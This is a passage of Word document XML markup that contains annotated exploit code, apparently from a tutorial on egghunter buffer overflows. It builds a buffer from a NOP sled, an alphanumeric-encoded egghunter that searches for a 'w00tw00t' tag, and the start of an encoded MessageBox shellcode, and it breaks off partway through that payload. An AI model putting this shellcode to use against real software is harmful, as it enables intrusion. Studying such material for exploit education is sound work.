                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00E72F21">
                              <w:rPr>
                                <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>#NOP SLED</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="251304A2" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="1468B5B7" w14:textId="77777777" w:rsidR="00CF75AD" w:rsidRPr="00CF75AD" w:rsidRDefault="00CF75AD" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="19C518D1" w14:textId="23C6E09E" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>$buffer .= "\x89\xe0\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>xda</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t xml:space="preserve">\xc0\xd9\x70\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43\x43" . </w:t>
                            </w:r>
                            <w:r w:rsidR="00E72F21">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidR="00E72F21">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="00E72F21" w:rsidRPr="00E72F21">
                              <w:rPr>
                                <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>#EGGHUNTER ENCODED ALPHA UPPER</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3955BB3B" w14:textId="1FA3C286" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t xml:space="preserve">"\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30" .    </w:t>
                            </w:r>
                            <w:r w:rsidR="00E72F21">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="00E72F21" w:rsidRPr="00E72F21">
                              <w:rPr>
                                <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>#LOOKS FOR w00tW00t</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="28FC8DD8" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7BDA4EEA" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="011250BC" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x43\x56\x4d\x51\x49\x5a\x4b\x4f\x44\x4f\x51\x52\x46\x32\x43\x5a\x44" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="36AFFB2A" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x42\x50\x58\x48\x4d\x46\x4e\x47\x4c\x43\x35\x51\x4a\x42\x54\x4a\x4f" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="18433CF3" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4e\x58\x42\x57\x46\x50\x46\x50\x44\x34\x4c\x4b\x4b\x4a\x4e\x4f\x44" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6685E82D" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x35\x4b\x5a\x4e\x4f\x43\x45\x4b\x57\x4b\x4f\x4d\x37\x41\x41";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3A290580" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="52C4E2B4" w14:textId="686A6033" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>$buffer .= "\x90" x 200;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="00E72F21">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00E72F21">
                              <w:rPr>
                                <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>#ANOTHER SLED TO DEMONSTRATE DISTANCE</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="663A001C" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>$buffer .= "w00tw00t";</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00E72F21">
                              <w:rPr>
                                <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>#w00tw00t TAG</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5A232184" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="10C99BA6" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>$buffer .= "\x89\xe7\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>xdb</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>\xd0\xd9\x77\xf4\x5d\x55\x59\x49\x49\x49\x49" .</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00E72F21">
                              <w:rPr>
                                <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>#MESSAGEBOX PAYLOAD</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2164E8DA" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3745B9DB" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="08F7C50D" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="244F49EF" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x49\x49\x5a" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="10D410DF" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4b\x4d\x4b\x49\x49\x52\x54\x56\x44\x5a\x54\x56\x51\x4e" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3297F395" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x32\x4f\x42\x52\x57\x56\x51\x49\x59\x45\x34\x4c\x4b\x54" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0A687A4B" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x31\x56\x50\x4c\x4b\x52\x56\x54\x4c\x4c\x4b\x43\x46\x45" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="65283695" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4c\x4c\x4b\x47\x36\x54\x48\x4c\x4b\x43\x4e\x47\x50\x4c" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="52C2D9D4" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4b\x47\x46\x56\x58\x50\x4f\x45\x48\x43\x45\x4c\x33\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="182B82D8" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x39\x45\x51\x58\x51\x4b\x4f\x4b\x51\x43\x50\x4c\x4b\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5847505D" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4c\x51\x34\x51\x34\x4c\x4b\x51\x55\x47\x4c\x4c\x4b\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="42E2ECF5" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x34\x56\x48\x52\x58\x45\x51\x5a\x4a\x4c\x4b\x50\x4a\x54" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="16A93F6F" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x58\x4c\x4b\x51\x4a\x47\x50\x45\x51\x5a\x4b\x4b\x53\x47" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="75F34349" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x44\x50\x49\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x5a\x4e\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1069500B" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x31\x4b\x4f\x50\x31\x49\x50\x4b\x4c\x4e\x4c\x4d\x54\x49" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="333067AD" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x50\x54\x34\x43\x37\x4f\x31\x58\x4f\x54\x4d\x43\x31\x58" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="63061BBB" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x47\x5a\x4b\x5a\x54\x47\x4b\x43\x4c\x51\x34\x47\x58\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7C62C480" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x55\x4d\x31\x4c\x4b\x51\x4a\x51\x34\x43\x31\x5a\x4b\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="74194E18" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x46\x4c\x4b\x54\x4c\x50\x4b\x4c\x4b\x50\x5a\x45\x4c\x43" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="09D5E8A1" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x31\x5a\x4b\x4c\x4b\x43\x34\x4c\x4b\x43\x31\x4b\x58\x4d" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6E4A3058" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x59\x50\x44\x56\x44\x45\x4c\x43\x51\x58\x43\x58\x32\x43" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2F2D813A" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x38\x47\x59\x4e\x34\x4c\x49\x4b\x55\x4b\x39\x4f\x32\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7FC35F37" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x48\x4c\x4e\x50\x4e\x54\x4e\x5a\x4c\x50\x52\x4d\x38\x4d" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0528B652" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="14"/>
                                <w:szCs w:val="14"/>
                              </w:rPr>
                              <w:t>"\x4f\x4b\x4f\x4b\x4f\x4b\x4f\x4b\x39\x47\x35\x54\x44\x4f" .</w:t>
                            </w:r>
